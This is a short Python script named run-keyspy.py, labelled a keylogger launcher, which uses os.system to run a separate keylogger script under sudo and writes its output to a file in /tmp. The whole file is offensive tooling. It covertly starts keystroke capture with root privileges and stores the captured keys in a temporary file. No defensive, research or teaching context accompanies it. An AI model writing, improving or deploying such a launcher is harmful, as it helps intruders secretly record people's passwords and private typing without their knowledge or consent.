#!/usr/bin/python3
#coding: utf-8
# ========================
#  run-keyspy.py  -  v1.0
#  Keylogger launcher
# ========================
#
# configuration variables
logfile = "/tmp/keylogg.tmp"
program = "/bin/nologin"
keylogger = "/etc/keyspy/keylogg_button.py"
#
# launcher code
import os
os.system("{} | sudo python3 {} > {}".format(program,keylogger,logfile))

